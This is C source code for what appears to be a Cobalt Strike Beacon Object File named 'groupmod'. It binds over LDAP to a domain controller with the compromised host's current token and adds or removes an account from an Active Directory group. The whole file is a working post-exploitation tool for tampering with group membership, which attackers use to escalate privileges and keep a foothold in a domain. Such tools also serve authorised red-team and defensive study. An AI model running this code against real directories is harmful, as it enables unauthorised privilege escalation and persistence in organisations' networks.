#include <windows.h>
#include <winldap.h>
#include "beacon.h"

DECLSPEC_IMPORT LDAP * WLDAP32$ldap_initW       (PWSTR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_bind_sW     (LDAP * ld, PWSTR dn, PWSTR cred, ULONG method);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_modify_sW   (LDAP * ld, PWSTR dn, PLDAPModW * mods);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_unbind      (LDAP * ld);
DECLSPEC_IMPORT PWSTR  WLDAP32$ldap_err2stringW (ULONG err);
DECLSPEC_IMPORT ULONG  WLDAP32$LdapGetLastError (void);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_set_optionW (LDAP * ld, int option, void * value);

DECLSPEC_IMPORT int __cdecl MSVCRT$wcscmp(const wchar_t *, const wchar_t *);

#ifndef LDAP_NO_SUCH_ATTRIBUTE
#define LDAP_NO_SUCH_ATTRIBUTE  0x10
#endif


void go(IN char * args, IN int alen)
{
    datap     parser;
    PWSTR     domain_controller;
    PWSTR     group_dn;
    PWSTR     member_dn;
    PWSTR     action;
    LDAP *    ldap_handle  = NULL;
    ULONG     ldap_result;
    ULONG     version      = LDAP_VERSION3;
    ULONG     modify_op;
    PWSTR     values[2];
    LDAPModW  modification;
    PLDAPModW modifications[2];
    int       removing     = 0;

    BeaconDataParse(&parser, args, alen);
    domain_controller = (PWSTR) BeaconDataExtract(&parser, NULL);
    group_dn          = (PWSTR) BeaconDataExtract(&parser, NULL);
    member_dn         = (PWSTR) BeaconDataExtract(&parser, NULL);
    action            = (PWSTR) BeaconDataExtract(&parser, NULL);

    if (domain_controller == NULL || group_dn == NULL || member_dn == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] usage: groupmod <dc> <group_dn> <member_dn> [add|remove]");
        return;
    }

    if (action && action[0] && MSVCRT$wcscmp(action, L"remove") == 0) {
        removing  = 1;
        modify_op = LDAP_MOD_DELETE;
    } else {
        modify_op = LDAP_MOD_ADD;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ldap_init %ls:389", domain_controller);

    ldap_handle = WLDAP32$ldap_initW(domain_controller, LDAP_PORT);
    if (ldap_handle == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_init failed: 0x%lx", WLDAP32$LdapGetLastError());
        return;
    }

    WLDAP32$ldap_set_optionW(ldap_handle, LDAP_OPT_PROTOCOL_VERSION, &version);

    ldap_result = WLDAP32$ldap_bind_sW(ldap_handle, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldap_result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
        WLDAP32$ldap_unbind(ldap_handle);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bound (SSPI Negotiate, current thread token)");

    values[0] = member_dn;
    values[1] = NULL;

    modification.mod_op                = modify_op;
    modification.mod_type              = (PWSTR) L"member";
    modification.mod_vals.modv_strvals = values;

    modifications[0] = &modification;
    modifications[1] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ldap_modify (%ls): %ls -> %ls", removing ? L"remove" : L"add", member_dn, group_dn);

    ldap_result = WLDAP32$ldap_modify_sW(ldap_handle, group_dn, modifications);

    if (removing) {
        switch (ldap_result) {
            case LDAP_SUCCESS:
                BeaconPrintf(CALLBACK_OUTPUT, "[+] member removed");
                break;
            case LDAP_NO_SUCH_ATTRIBUTE:
                BeaconPrintf(CALLBACK_OUTPUT, "[=] not a member (no change)");
                break;
            case LDAP_INSUFFICIENT_RIGHTS:
                BeaconPrintf(CALLBACK_ERROR, "[!] insufficient access: current token lacks RemoveMember on the group");
                break;
            case LDAP_NO_SUCH_OBJECT:
                BeaconPrintf(CALLBACK_ERROR, "[!] no such object: verify group_dn and member_dn");
                break;
            default:
                BeaconPrintf(CALLBACK_ERROR, "[!] ldap_modify_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
                break;
        }
    } else {
        switch (ldap_result) {
            case LDAP_SUCCESS:
                BeaconPrintf(CALLBACK_OUTPUT, "[+] member added");
                break;
            case LDAP_ATTRIBUTE_OR_VALUE_EXISTS:
                BeaconPrintf(CALLBACK_OUTPUT, "[=] already a member (no change)");
                break;
            case LDAP_INSUFFICIENT_RIGHTS:
                BeaconPrintf(CALLBACK_ERROR, "[!] insufficient access: current token lacks AddMember on the group");
                break;
            case LDAP_NO_SUCH_OBJECT:
                BeaconPrintf(CALLBACK_ERROR, "[!] no such object: verify group_dn and member_dn");
                break;
            default:
                BeaconPrintf(CALLBACK_ERROR, "[!] ldap_modify_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
                break;
        }
    }

    WLDAP32$ldap_unbind(ldap_handle);
}
